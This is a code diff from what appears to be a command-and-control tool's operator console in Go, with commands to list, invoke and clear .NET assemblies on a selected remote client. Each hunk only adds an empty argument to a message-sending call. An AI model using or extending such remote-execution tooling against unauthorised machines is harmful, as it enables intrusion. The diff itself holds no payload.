@@ -106,7 +106,7 @@ var assemblyListCmd = &grumble.Command{
 		// 发送消息
 		msg := "assemblyList"
 		data := ""
-		retData := common.SendSuccessMsg(SelectClientId, common.ClientId, msg, data)
+		retData := common.SendSuccessMsg(SelectClientId, common.ClientId, msg, data, "")
 		if retData.Code != retcode.SUCCESS {
 			colorcode.PrintMessage(colorcode.SIGN_FAIL, "assembly list failed")
 			return nil
@@ -143,7 +143,7 @@ var assemblyInvokeCmd = &grumble.Command{
 		var loadedAssemblyNames []string
 		msg := "assemblyList"
 		data := ""
-		retData := common.SendSuccessMsg(SelectClientId, common.ClientId, msg, data)
+		retData := common.SendSuccessMsg(SelectClientId, common.ClientId, msg, data, "")
 		if retData.Code != retcode.SUCCESS {
 			colorcode.PrintMessage(colorcode.SIGN_FAIL, "assembly list failed")
 			return nil
@@ -185,7 +185,7 @@ var assemblyInvokeCmd = &grumble.Command{
 		msg := "assemblyInvoke"
 		jsonData, _ := json.Marshal(args)
 		data, _ := crypto.Encrypt(jsonData, []byte(config.AesKey))
-		retData := common.SendSuccessMsg(SelectClientId, common.ClientId, msg, data)
+		retData := common.SendSuccessMsg(SelectClientId, common.ClientId, msg, data, "")
 		if retData.Code != retcode.SUCCESS {
 			colorcode.PrintMessage(colorcode.SIGN_FAIL, "assembly list failed")
 			return nil
@@ -240,7 +240,7 @@ var assemblyClearCmd = &grumble.Command{
 		// 发送消息
 		msg := "assemblyClear"
 		data := ""
-		retData := common.SendSuccessMsg(SelectClientId, common.ClientId, msg, data)
+		retData := common.SendSuccessMsg(SelectClientId, common.ClientId, msg, data, "")
 		if retData.Code != retcode.SUCCESS {
 			colorcode.PrintMessage(colorcode.SIGN_FAIL, "assembly clear failed")
 			return nil
